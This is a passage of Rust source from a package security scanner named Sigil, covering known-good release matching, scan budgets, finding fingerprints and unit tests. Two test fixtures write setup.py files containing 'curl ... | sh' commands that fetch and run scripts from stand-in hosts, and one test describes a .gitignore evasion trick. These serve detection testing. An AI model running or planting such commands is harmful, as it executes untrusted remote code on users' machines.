                file_findings.push(Finding {
                    phase: Phase::Provenance,
                    rule: budget::BUDGET_RULE_ID.to_string(),
                    severity: Severity::Medium,
                    file: rel_path.clone(),
                    line: None,
                    snippet: format!(
                        "Scan budget exhausted after {:.1}s — this file was not fully analysed \
                         (raise or disable with {}=<seconds>, 0 to disable)",
                        file_budget_limit.map(|d| d.as_secs_f64()).unwrap_or(0.0),
                        budget::BUDGET_ENV
                    ),
                    weight: 1,
                    kev: false,
                    epss: 0.0,
                    fingerprint: String::new(),
                    locator: None,
                    // Irrelevant either way at Medium — only Critical findings
                    // are gated — so it takes the default rather than making a
                    // claim about evidence it does not carry.
                    evidence: crate::corpus::schema::Evidence::default(),
                });
            }

            // A marker on the line that carried an encoded blob also covers
            // findings decoded out of it, because those are re-anchored to
            // that line above.
            let (mut kept, mut silenced) = timing::measure(timing::Stage::Suppress, || {
                suppress::apply(&markers, file_findings)
            });

            // Correlation runs over the findings a reviewer has not already
            // dismissed, and its own findings can be dismissed the same way.
            let chains = timing::measure(timing::Stage::Correlate, || {
                let lines: Vec<&str> = source_text.lines().collect();
                correlate::apply(
                    &crate::corpus::compiled::corpus().correlation_rules,
                    &kept,
                    &lines,
                )
            });
            let (chain_kept, mut chain_silenced) = suppress::apply(&markers, chains);
            kept.extend(chain_kept);
            silenced.append(&mut chain_silenced);

            if timing::enabled() {
                let shape = bundled::LineShape::measure(&source_text);
                timing::record_file(timing::FileRecord {
                    path: rel_path.clone(),
                    nanos: file_start.elapsed().as_nanos() as u64,
                    bytes: contents.len(),
                    lines: shape.lines,
                    longest_line: shape.longest_line,
                    derived_units,
                    bundled: shape.is_machine_generated(),
                    budget_exhausted,
                });
            }
            (kept, silenced)
        })
        .collect();

    let mut inline_suppressed: Vec<Finding> = Vec::new();
    let mut inline_suppressions: Vec<String> = Vec::new();
    for (kept, silenced) in per_file {
        findings.extend(kept);
        for (f, note) in silenced {
            inline_suppressed.push(f);
            inline_suppressions.push(note);
        }
    }

    // A lifecycle script that runs a file with findings is its own finding,
    // one level above the worst of them: that code executes on install,
    // whether or not the package is ever imported.
    let links = manifests::link_install_referenced(strip_base, &files, &findings);
    findings.extend(links);

    if let Some(min) = min_sev {
        findings.retain(|f| f.severity >= min);
    }

    let duration_ms = start.elapsed().as_millis() as u64;

    assign_fingerprints(&mut findings);
    assign_fingerprints(&mut inline_suppressed);

    // Known-good recognition (ADR-0011). Findings in files that are
    // byte-identical to published releases move to `suppressed_findings` with
    // attribution — never dropped. Files the corpus does not recognise are
    // scanned and reported exactly as before, so an absent or partial index
    // can only ever reduce noise, never create false confidence.
    let mut suppressed_by_knowngood: Vec<Finding> = Vec::new();
    let mut knowngood_note: Option<String> = None;
    if !known_good.is_empty() {
        let kg_start = std::time::Instant::now();
        let recognised: std::collections::HashMap<String, (String, String)> = files
            .par_iter()
            .filter_map(|p| {
                let bytes = std::fs::read(p).ok()?;
                match known_good.lookup(&bytes) {
                    crate::knowngood::Match::Exact { coordinate, path } => {
                        let rel = p
                            .strip_prefix(strip_base)
                            .unwrap_or(p)
                            .to_string_lossy()
                            .to_string();
                        Some((rel, (coordinate, path)))
                    }
                    crate::knowngood::Match::Unknown => None,
                }
            })
            .collect();

        if !recognised.is_empty() {
            let mut kept = Vec::with_capacity(findings.len());
            for f in findings.into_iter() {
                match recognised.get(&f.file) {
                    Some(_) => suppressed_by_knowngood.push(f),
                    None => kept.push(f),
                }
            }
            findings = kept;

            let mut coords: Vec<&String> = recognised.values().map(|(c, _)| c).collect();
            coords.sort_unstable();
            coords.dedup();
            knowngood_note = Some(format!(
                "known-good: {} file(s) matched {} published release(s) unmodified",
                recognised.len(),
                coords.len()
            ));
        }

        // Drift: a release we partly recognise, where some files are not the
        // published bytes, is the trojanised-dependency shape. This is the
        // detection Sigil could not previously make at any severity.
        findings.extend(detect_knowngood_drift(
            &files,
            strip_base,
            &known_good,
            &recognised,
        ));
        assign_fingerprints(&mut findings);
        timing::add(timing::Stage::KnownGood, kg_start.elapsed());
    }

    timing::report(files_scanned, start.elapsed(), TIMING_SLOWEST_FILES);

    let score = scoring::calculate_score(&findings);
    let verdict = scoring::determine_verdict_with_size(&findings, score, files_scanned);

    let compiled = crate::corpus::compiled::corpus();
    ScanResult {
        findings,
        score,
        verdict,
        files_scanned,
        duration_ms,
        suppressed_findings: suppressed_by_knowngood,
        suppressed_by: knowngood_note,
        scanner: Some(ScannerInfo {
            engine_version: env!("CARGO_PKG_VERSION").to_string(),
            corpus_digest: compiled.digest(),
            corpus_rule_count: compiled.rule_count(),
            rule_ids: compiled.rule_ids(),
        }),
        inline_suppressed,
        inline_suppressions,
        platform,
    }
}

#[cfg(test)]
mod phase_registry_tests {
    use super::*;

    /// `Phase::ALL` must actually list every variant. If a phase is added to
    /// the enum but not to `ALL`, every consumer that iterates phases silently
    /// skips it — which is the shape of the cloud-signature misfiling bug.
    ///
    /// The match below is exhaustive, so adding a variant fails to compile
    /// until it is handled here, and the assertion then forces it into `ALL`.
    #[test]
    fn phase_registry_is_total() {
        for phase in Phase::ALL {
            // Exhaustive match: a new variant breaks the build here first.
            let expected_in_all = match phase {
                Phase::InstallHooks
                | Phase::CodePatterns
                | Phase::NetworkExfil
                | Phase::Credentials
                | Phase::Obfuscation
                | Phase::Provenance
                | Phase::PromptInjection
                | Phase::SkillSecurity
                | Phase::InferenceSecurity => true,
            };
            assert!(expected_in_all);
        }
        assert_eq!(
            Phase::ALL.len(),
            9,
            "Phase::ALL is out of sync with the Phase enum"
        );
    }

    /// Every phase must round-trip through its own canonical name. This is
    /// what makes a missing parse arm impossible: `Phase::from_name` is
    /// derived from `ALL`, so it cannot omit a phase the way three separate
    /// hand-written `match` blocks could.
    #[test]
    fn every_phase_round_trips_through_its_canonical_name() {
        for phase in Phase::ALL {
            assert_eq!(
                Phase::from_name(phase.canonical_name()),
                Some(phase),
                "{phase} did not round-trip"
            );
        }
    }

    #[test]
    fn from_name_accepts_kebab_and_concatenated_spellings() {
        assert_eq!(
            Phase::from_name("prompt-injection"),
            Some(Phase::PromptInjection)
        );
        assert_eq!(
            Phase::from_name("promptinjection"),
            Some(Phase::PromptInjection)
        );
        assert_eq!(
            Phase::from_name("PROMPT_INJECTION"),
            Some(Phase::PromptInjection)
        );
    }

    #[test]
    fn from_name_rejects_unknown_phases() {
        assert_eq!(Phase::from_name("phase_from_the_future"), None);
        assert_eq!(Phase::from_name(""), None);
    }

    /// Canonical names must be unique, or `from_name` becomes ambiguous.
    #[test]
    fn canonical_names_are_unique() {
        let mut names: Vec<&str> = Phase::ALL.iter().map(|p| p.canonical_name()).collect();
        names.sort_unstable();
        let before = names.len();
        names.dedup();
        assert_eq!(before, names.len(), "duplicate canonical phase name");
    }
}

#[cfg(test)]
mod oversized_tests {
    use super::*;
    use std::io::Write;

    /// A 10 MB+ setup.py with the payload after one enormous literal: the
    /// old behaviour skipped the file entirely, so the payload was never
    /// seen and only PROV-004 (Low) fired.
    #[test]
    fn oversized_script_head_and_tail_are_scanned_with_real_line_numbers() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("setup.py");
        let mut f = std::fs::File::create(&path).unwrap();
        f.write_all(b"import os\n").unwrap();
        f.write_all(b"blob = b'").unwrap();
        let chunk = vec![b'A'; 1 << 20];
        for _ in 0..11 {
            f.write_all(&chunk).unwrap();
        }
        f.write_all(b"'\n").unwrap();
        f.write_all(b"os.system('curl http://x.example/a.sh | sh')\n")
            .unwrap();
        f.write_all(b"setup(name='x')\n").unwrap();
        drop(f);
        assert!(std::fs::metadata(&path).unwrap().len() > MAX_CONTENT_SCAN_BYTES);

        let result = run_scan(dir.path(), None, None);
        let tail_hit = result
            .findings
            .iter()
            .find(|f| f.rule == "CODE-014")
            .expect("os.system in the tail must be found");
        assert_eq!(tail_hit.line, Some(3), "{tail_hit:?}");
        assert!(tail_hit.snippet.starts_with("[tail of oversized file] "));
        assert!(
            result.findings.iter().any(|f| f.rule == "PROV-007"),
            "a megabyte setup.py is itself a finding: {:?}",
            result.findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
        );
    }
}

#[cfg(test)]
mod walker_tests {
    use super::*;
    use std::fs;

    fn touch(path: &Path) {
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, "content").unwrap();
    }

    #[test]
    fn excludes_default_dirs() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        touch(&root.join("src/main.js"));
        touch(&root.join("node_modules/evil/index.js"));
        touch(&root.join("target/debug/x.rs"));
        touch(&root.join(".next/server/page.js"));
        // Build output is shipped code in a published package, so it is
        // walked; only a real git checkout's .gitignore keeps it out.
        touch(&root.join("dist/bundle.js"));

        let files = collect_files(root);
        let rels: Vec<String> = files
            .iter()
            .map(|p| p.strip_prefix(root).unwrap().to_string_lossy().to_string())
            .collect();
        assert_eq!(rels, vec!["dist/bundle.js", "src/main.js"]);
    }

    #[test]
    fn walks_dotfiles_but_not_git_dir() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        touch(&root.join(".cursorrules"));
        touch(&root.join(".git/objects/aa/bb"));

        let files = collect_files(root);
        let rels: Vec<String> = files
            .iter()
            .map(|p| p.strip_prefix(root).unwrap().to_string_lossy().to_string())
            .collect();
        assert_eq!(rels, vec![".cursorrules"]);
    }

    #[test]
    fn respects_sigilignore_always() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        touch(&root.join("keep.js"));
        touch(&root.join("skipped/noise.js"));
        fs::write(root.join(".sigilignore"), "skipped/\n").unwrap();

        let files = collect_files(root);
        let rels: Vec<String> = files
            .iter()
            .map(|p| p.strip_prefix(root).unwrap().to_string_lossy().to_string())
            .collect();
        assert!(rels.contains(&"keep.js".to_string()));
        assert!(!rels.iter().any(|r| r.starts_with("skipped/")));
    }

    #[test]
    fn gitignore_ignored_without_git_dir_tarball_evasion() {
        // A malicious .gitignore inside an extracted tarball (no .git) must
        // NOT hide files from the scanner.
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        touch(&root.join("payload.js"));
        fs::write(root.join(".gitignore"), "payload.js\n").unwrap();

        let files = collect_files(root);
        let rels: Vec<String> = files
            .iter()
            .map(|p| p.strip_prefix(root).unwrap().to_string_lossy().to_string())
            .collect();
        assert!(rels.contains(&"payload.js".to_string()));
    }
}

#[cfg(test)]
mod inline_suppression_tests {
    use super::*;
    use std::fs;

    /// The marker on a flagged line moves that finding — and only that
    /// finding — out of the active set, with attribution.
    #[test]
    fn marker_moves_finding_to_inline_suppressed() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fs::write(
            root.join("app.py"),
            "import os\n\
             os.system(cmd)  # sigil:ignore CODE-014 -- argv is validated above\n\
             eval(expr)\n",
        )
        .unwrap();

        let result = run_scan(root, None, None);
        assert!(
            !result.findings.iter().any(|f| f.rule == "CODE-014"),
            "CODE-014 should be suppressed: {:?}",
            result.findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
        );
        assert!(result.findings.iter().any(|f| f.rule == "CODE-001"));
        assert_eq!(result.inline_suppressed.len(), 1);
        assert_eq!(result.inline_suppressed[0].rule, "CODE-014");
        assert_eq!(
            result.inline_suppressions[0],
            "app.py:2 CODE-014 — argv is validated above"
        );
        assert!(!result.inline_suppressed[0].fingerprint.is_empty());
        // Score and verdict are computed over the active set only.
        assert_eq!(result.score, scoring::calculate_score(&result.findings));
    }
}

#[cfg(test)]
mod budget_tests {
    use super::*;
    use std::fs;
    use std::sync::Mutex;

    // Serialise the tests that mutate SIGIL_FILE_BUDGET_SECS so the parallel
    // test runner does not race on a process-wide variable.
    static ENV_LOCK: Mutex<()> = Mutex::new(());

    /// A tree with two files, each of which produces findings on its own.
    fn two_flagged_files() -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("a.py"), "import os\nos.system(cmd)\n").unwrap();
        fs::write(dir.path().join("b.py"), "import os\neval(expr)\n").unwrap();
        dir
    }

    /// With the budget disabled, nothing is truncated and no truncation
    /// finding appears — the default path must stay quiet.
    #[test]
    fn no_budget_finding_when_the_budget_is_not_hit() {
        let _lock = ENV_LOCK.lock().unwrap();
        std::env::remove_var(budget::BUDGET_ENV);
        let dir = two_flagged_files();
        let result = run_scan(dir.path(), None, None);
        assert!(
            !result
                .findings
                .iter()
                .any(|f| f.rule == budget::BUDGET_RULE_ID),
            "budget finding on a scan that never ran out of time"
        );
        assert!(!result.findings.is_empty());
    }

    /// A phase filter chooses which rules run. It must not decide whether the
    /// caller is told that the analyser gave up, because the project's own
    /// evaluation harness selects exactly the content phases — so a truncated
    /// scan under those phases used to come back empty and read as clean.
    #[test]
    fn truncation_is_reported_even_when_provenance_is_not_selected() {
        let _lock = ENV_LOCK.lock().unwrap();
        std::env::set_var(budget::BUDGET_ENV, "0.000000001");
        let dir = two_flagged_files();
        let phases: Vec<String> = [
            "install_hooks",
            "code_patterns",
            "network_exfil",
            "credentials",
            "obfuscation",
            "prompt_injection",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        let result = run_scan(dir.path(), Some(&phases), None);
        std::env::remove_var(budget::BUDGET_ENV);

        let truncated: Vec<&str> = result
            .findings
            .iter()
            .filter(|f| f.rule == budget::BUDGET_RULE_ID)
            .map(|f| f.file.as_str())
            .collect();
        assert_eq!(
            truncated.len(),
            2,
            "truncation must be visible under a content-only phase filter, got {:#?}",
            result
                .findings
                .iter()
                .map(|f| (&f.rule, &f.file))
                .collect::<Vec<_>>()
        );
        // The truncation must carry weight of its own, so a file the analyser
        // gave up on cannot read as a file with nothing in it. It does not
        // promise a floor on the verdict: two Medium findings score 4, and on
        // a two-file tree that is honestly still Low. What it promises is that
        // the score and the findings are not zero.
        assert!(result.score > 0, "truncation must contribute to the score");
        assert!(result
            .findings
            .iter()
            .all(|f| f.rule != budget::BUDGET_RULE_ID || f.severity == Severity::Medium));
    }

    /// A budget of effectively zero trips on every file. Each file must
    /// report the truncation exactly once — not once per phase, not once per
    /// derived unit — and the finding must be Medium and filed under
    /// Provenance.
    #[test]
    fn exhaustion_emits_exactly_one_visible_finding_per_file() {
        let _lock = ENV_LOCK.lock().unwrap();
        std::env::set_var(budget::BUDGET_ENV, "0.000000001");
        let dir = two_flagged_files();
        let result = run_scan(dir.path(), None, None);
        std::env::remove_var(budget::BUDGET_ENV);

        let mut files: Vec<&str> = result
            .findings
            .iter()
            .filter(|f| f.rule == budget::BUDGET_RULE_ID)
            .map(|f| f.file.as_str())
            .collect();
        files.sort_unstable();
        assert_eq!(
            files,
            vec!["a.py", "b.py"],
            "expected one truncation finding per file, got {:#?}",
            result
                .findings
                .iter()
                .map(|f| (&f.rule, &f.file))
                .collect::<Vec<_>>()
        );
        for f in result
            .findings
            .iter()
            .filter(|f| f.rule == budget::BUDGET_RULE_ID)
        {
            assert_eq!(f.severity, Severity::Medium);
            assert_eq!(f.phase, Phase::Provenance);
            assert!(f.snippet.contains(budget::BUDGET_ENV), "{}", f.snippet);
            assert!(!f.fingerprint.is_empty(), "truncation finding must diff");
        }
    }

    /// Findings made before the clock runs out survive it. The budget is
    /// checked between rules, so the first phase's first rule always runs:
    /// a scan that hits the budget still reports what it saw.
    #[test]
    fn findings_made_before_exhaustion_are_kept() {
        let _lock = ENV_LOCK.lock().unwrap();
        let dir = tempfile::tempdir().unwrap();
        // A generous budget: the file is tiny, so nothing is truncated and
        // every finding is present.
        std::env::set_var(budget::BUDGET_ENV, "30");
        fs::write(
            dir.path().join("setup.py"),
            "import os\nos.system('curl http://evil.example/x.sh | sh')\n",
        )
        .unwrap();
        let result = run_scan(dir.path(), None, None);
        std::env::remove_var(budget::BUDGET_ENV);
        assert!(
            !result
                .findings
                .iter()
                .any(|f| f.rule == budget::BUDGET_RULE_ID),
            "30s budget should not trip on a two-line file"
        );
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.phase == Phase::CodePatterns),
            "expected the code-pattern finding to survive: {:#?}",
            result.findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
        );
    }

    /// A malformed value must not silently remove the bound.
    #[test]
    fn a_bad_budget_value_falls_back_to_the_default() {
        let _lock = ENV_LOCK.lock().unwrap();
        for bad in ["banana", "-1", ""] {
            std::env::set_var(budget::BUDGET_ENV, bad);
            let limit = budget::configured_budget();
            assert_eq!(
                limit.map(|d| d.as_secs_f64()),
                Some(budget::DEFAULT_FILE_BUDGET_SECS),
                "{bad:?} did not fall back to the default"
            );
        }
        std::env::set_var(budget::BUDGET_ENV, "0");
        assert!(
            budget::configured_budget().is_none(),
            "an explicit 0 must disable the budget"
        );
        std::env::remove_var(budget::BUDGET_ENV);
    }
}

#[cfg(test)]
mod knowngood_coordinate_tests {
    use super::*;
    use std::fs;

    fn npm_tree(dir: &Path, name: &str, version: &str) {
        fs::create_dir_all(dir.join("package")).unwrap();
        fs::write(
            dir.join("package/package.json"),
            format!("{{\n  \"name\": \"{name}\",\n  \"version\": \"{version}\"\n}}\n"),
        )
        .unwrap();
    }

    /// Matching files alone do not make a tree a release. A neighbouring
    /// version of the same package shares most of its bytes, so anchoring on
    /// that shared majority reported every file that legitimately changed as a
    /// trojanised release.
    #[test]
    fn drift_needs_the_tree_to_claim_the_indexed_coordinate() {
        let dir = tempfile::tempdir().unwrap();
        npm_tree(dir.path(), "semver", "7.7.2");

        assert!(
            tree_claims_release(dir.path(), "package/", "npm:semver@7.7.2"),
            "the version it declares"
        );
        assert!(
            !tree_claims_release(dir.path(), "package/", "npm:semver@7.8.5"),
            "a different version of the same package"
        );
        assert!(
            !tree_claims_release(dir.path(), "package/", "npm:semverish@7.7.2"),
            "a different package at the same version"
        );
    }

    /// A tree that ships no manifest states no identity, so nothing is
    /// compared against it in either direction.
    #[test]
    fn a_tree_without_a_manifest_claims_nothing() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("package")).unwrap();
        fs::write(dir.path().join("package/index.js"), "module.exports = 1;\n").unwrap();
        assert!(!tree_claims_release(
            dir.path(),
            "package/",
            "npm:semver@7.7.2"
        ));
    }

    /// PyPI normalises `_`, `.` and `-` in distribution names, so a PKG-INFO
    /// that spells the name differently is still the same release.
    #[test]
    fn pypi_metadata_name_is_compared_normalised() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("pkg");
        fs::create_dir_all(&root).unwrap();
        fs::write(
            root.join("PKG-INFO"),
            "Metadata-Version: 2.1\nName: typing_extensions\nVersion: 4.12.2\n",
        )
        .unwrap();
        assert!(tree_claims_release(
            dir.path(),
            "pkg/",
            "pypi:typing-extensions@4.12.2"
        ));
        assert!(!tree_claims_release(
            dir.path(),
            "pkg/",
            "pypi:typing-extensions@4.11.0"
        ));
    }
}

#[cfg(test)]
mod fixtures_tests {
    use super::*;
    use std::path::PathBuf;

    fn fixtures_root() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../tests/fixtures")
    }

    #[test]
    fn fixture_corpus_matches_manifest() {
        let root = fixtures_root();
        let manifest_raw =
            std::fs::read_to_string(root.join("MANIFEST.json")).expect("MANIFEST.json readable");
        let manifest: serde_json::Value =
            serde_json::from_str(&manifest_raw).expect("MANIFEST.json valid");

        // Disclosure fields are mandatory (CLAUDE.md No Fake Data).
        for key in ["data_source", "sample_size", "limitations"] {
            assert!(manifest.get(key).is_some(), "manifest missing {key}");
        }

        let cases = manifest["cases"].as_array().expect("cases array");
        for case in cases {
            let rel = case["path"].as_str().unwrap();
            let file = root.join(rel);
            // Scan the single fixture file's parent so only it is in scope,
            // then keep findings for this file.
            let result = run_scan(&file, None, None);

            if case
                .get("expect_clean")
                .and_then(|v| v.as_bool())
                .unwrap_or(false)
            {
                assert!(
                    result.findings.is_empty(),
                    "{rel} expected clean, got {:?}",
                    result.findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
                );
                continue;
            }

            let want_phase = case["expect_phase"].as_str().unwrap();
            let want_sev = severity_from_name(case["expect_min_severity"].as_str().unwrap())
                .expect("valid severity in manifest");
            let hit = result
                .findings
                .iter()
                .any(|f| format!("{:?}", f.phase) == want_phase && f.severity >= want_sev);
            assert!(
                hit,
                "{rel} expected phase {want_phase} >= {want_sev:?}; got {:?}",
                result
                    .findings
                    .iter()
                    .map(|f| (format!("{:?}", f.phase), f.severity, &f.rule))
                    .collect::<Vec<_>>()
            );
        }
    }
}

#[cfg(test)]
mod fingerprint_tests {
    use super::*;

    fn f(rule: &str, file: &str, line: usize, snippet: &str) -> Finding {
        Finding {
            phase: Phase::CodePatterns,
            rule: rule.to_string(),
            severity: Severity::High,
            file: file.to_string(),
            line: Some(line),
            snippet: snippet.to_string(),
            weight: 5,
            kev: false,
            epss: 0.0,
            fingerprint: String::new(),
            locator: None,
            evidence: Default::default(),
        }
    }

    /// The whole point: a finding that moves down the file is the same
    /// finding. Keying identity on the line number is what made `sigil diff`
    /// report every finding below an inserted line as new *and* resolved.
    #[test]
    fn fingerprint_survives_line_drift() {
        let mut a = [f("CODE-001", "a.js", 12, "sample rule hit: token-a")];
        let mut b = [f("CODE-001", "a.js", 480, "sample rule hit: token-a")];
        assign_fingerprints(&mut a);
        assign_fingerprints(&mut b);
        assert_eq!(a[0].fingerprint, b[0].fingerprint);
        assert!(!a[0].fingerprint.is_empty());
    }

    /// Reindenting a line must not change its identity either.
    #[test]
    fn fingerprint_survives_reindentation() {
        let mut a = [f("CODE-001", "a.js", 1, "sample rule hit: token-a")];
        let mut b = [f("CODE-001", "a.js", 1, "sample rule hit:      token-a")];
        assign_fingerprints(&mut a);
        assign_fingerprints(&mut b);
        assert_eq!(a[0].fingerprint, b[0].fingerprint);
    }

    #[test]
    fn different_rule_file_or_content_differ() {
        let mut v = [
            f("CODE-001", "a.js", 1, "sample rule hit: token-a"),
            f("CODE-002", "a.js", 1, "sample rule hit: token-a"),
            f("CODE-001", "b.js", 1, "sample rule hit: token-a"),
            f("CODE-001", "a.js", 1, "sample rule hit: token-b"),
        ];
        assign_fingerprints(&mut v);
        let mut fps: Vec<&str> = v.iter().map(|x| x.fingerprint.as_str()).collect();
        fps.sort_unstable();
        let before = fps.len();
        fps.dedup();
        assert_eq!(before, fps.len(), "distinct findings collided: {v:#?}");
    }

    /// Genuine repeats of the same rule and text in one file are still
    /// distinct findings and must not collapse into one fingerprint.
    #[test]
    fn repeated_identical_matches_stay_distinct() {
        let mut v = [
            f("CODE-001", "a.js", 1, "sample rule hit: token-a"),
            f("CODE-001", "a.js", 9, "sample rule hit: token-a"),
            f("CODE-001", "a.js", 40, "sample rule hit: token-a"),
        ];
        assign_fingerprints(&mut v);
        let mut fps: Vec<&str> = v.iter().map(|x| x.fingerprint.as_str()).collect();
        fps.sort_unstable();
        fps.dedup();
        assert_eq!(fps.len(), 3, "repeats collapsed: {v:#?}");
    }

    /// Fingerprints must be stable across runs, or GitHub Code Scanning
    /// re-raises every alert on every scan.
    #[test]
    fn fingerprints_are_deterministic() {
        let build = || {
            let mut v = [
                f("CODE-001", "a.js", 1, "sample rule hit: token-a"),
                f("NET-012", "b.sh", 4, "sample rule hit: token-c"),
            ];
            assign_fingerprints(&mut v);
            v
        };
        let a = build();
        let b = build();
        assert_eq!(a[0].fingerprint, b[0].fingerprint);
        assert_eq!(a[1].fingerprint, b[1].fingerprint);
    }
}
